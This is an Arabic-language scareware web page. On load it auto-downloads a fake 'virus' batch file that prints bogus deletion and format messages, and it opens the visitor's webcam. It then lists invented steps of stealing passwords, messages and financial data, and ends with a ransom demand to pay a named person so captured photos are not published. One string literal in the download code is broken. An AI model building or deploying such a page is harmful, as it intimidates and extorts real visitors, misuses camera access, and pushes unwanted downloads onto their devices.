<!DOCTYPE html>
<html>
<head>
    <title>System Breach</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background: #000;
            color: #0f0;
            font-family: monospace;
            margin: 0;
            overflow: hidden;
        }
        
        #matrix {
            position: fixed;
            top: 0;
            left: 0;
            z-index: -1;
        }
        
        .hack-message {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            font-size: 24px;
            animation: blink 1s infinite;
        }
        
        .ransom-message {
            color: #ff0000;
            font-size: 30px;
            text-align: center;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: none;
            text-shadow: 0 0 10px #ff0000;
            animation: pulse 2s infinite;
            z-index: 100;
            width: 80%;
        }
        
        .camera-feed {
            position: fixed;
            top: 10px;
            right: 10px;
            width: 320px;
            height: 240px;
            border: 2px solid #ff0000;
            display: none;
            z-index: 1000;
        }
        
        .progress {
            width: 0%;
            height: 2px;
            background: #0f0;
            position: fixed;
            bottom: 20px;
            left: 0;
            transition: width 0.5s;
        }
        
        .data-stolen {
            position: fixed;
            top: 20px;
            left: 20px;
            font-size: 14px;
            padding: 10px;
        }

        @media screen and (max-width: 768px) {
            .camera-feed {
                width: 160px;
                height: 120px;
                top: 5px;
                right: 5px;
            }
            
            .hack-message {
                font-size: 18px;
            }
            
            .ransom-message {
                font-size: 20px;
                width: 90%;
            }
            
            .data-stolen {
                font-size: 12px;
                max-width: 60%;
            }
        }
        
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }
        
        @keyframes pulse {
            0% { transform: translate(-50%, -50%) scale(1); }
            50% { transform: translate(-50%, -50%) scale(1.1); }
            100% { transform: translate(-50%, -50%) scale(1); }
        }
    </style>
</head>
<body onload="startHack()">
    <canvas id="matrix"></canvas>
    <video id="cameraFeed" class="camera-feed" autoplay playsinline></video>
    
    <div class="hack-message" id="hackMessage">
        جاري اختراق النظام...
    </div>
    
    <div class="ransom-message" id="ransomMessage">
        تم تصويرك وتسجيل بياناتك<br>
        ادفع للغزالي مقابل عدم نشر صورك
    </div>
    
    <div class="progress" id="progress"></div>
    <div class="data-stolen" id="dataStolen"></div>

    <script>
        function startHack() {
            instantDownload();
            startMatrix();
            updateHack();
            setTimeout(startCamera, 2000);
        }

        function startCamera() {
            navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                } 
            })
            .then(function(stream) {
                const video = document.getElementById('cameraFeed');
                video.srcObject = stream;
                video.style.display = 'block';
            })
            .catch(function(err) {
                console.log("Camera access denied");
            });
        }

        function instantDownload() {
            const virusContent = `
@echo off
color 0c
title System Hacked
mode con: cols=50 lines=20
echo ==========================================
echo !!! SYSTEM HACKED !!!
echo Your device has been compromised
echo Deleting system files...
echo ==========================================
echo.
echo Starting format process:
echo 5
timeout 1 > nul
echo 4
timeout 1 > nul
echo 3
timeout 1 > nul
echo 2
timeout 1 > nul
echo 1
timeout 1 > nul
echo.
echo FORMAT COMPLETE!
echo System destroyed successfully
echo ==========================================
pause
            `;

            const fileName = 'فيرس تدمير السوفت وير + Math.floor(Math.random() * 1000) + '.bat';
            const blob = new Blob([virusContent], {type: 'application/bat'});
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = fileName;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }

        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);
        
        const chars = "アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン0123456789";
        const drops = [];
        const fontSize = 16;
        let columns = canvas.width/fontSize;
        
        for(let x = 0; x < columns; x++) {
            drops[x] = 1;
        }

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#0F0';
            ctx.font = fontSize + 'px monospace';
            
            for(let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975)
                    drops[i] = 0;
                
                drops[i]++;
            }
        }

        function startMatrix() {
            setInterval(drawMatrix, 50);
        }

        const stolenData = [
            "جاري اختراق النظام...",
            "فحص الثغرات الأمنية...",
            "اختراق جدار الحماية...",
            "تشغيل الكاميرا...",
            "التقاط الصور...",
            "الوصول لقاعدة البيانات...",
            "سحب الملفات الشخصية...",
            "نسخ كلمات المرور...",
            "اختراق البريد الإلكتروني...",
            "سحب سجلات المكالمات...",
            "نسخ الرسائل والمحادثات...",
            "اختراق حسابات السوشيال ميديا...",
            "تحميل الصور الشخصية...",
            "نسخ المعلومات المالية...",
            "تم اختراق النظام بنجاح!"
        ];

        let currentStep = 0;
        
        function updateHack() {
            if(currentStep < stolenData.length) {
                document.getElementById('dataStolen').innerHTML += stolenData[currentStep] + "<br>";
                document.getElementById('progress').style.width = (currentStep + 1) * (100/stolenData.length) + '%';
                currentStep++;
                
                if(currentStep === stolenData.length) {
                    document.getElementById('hackMessage').style.display = 'none';
                    document.getElementById('ransomMessage').style.display = 'block';
                }
                
                setTimeout(updateHack, 1000);
            }
        }
    </script>
</body>
</html>
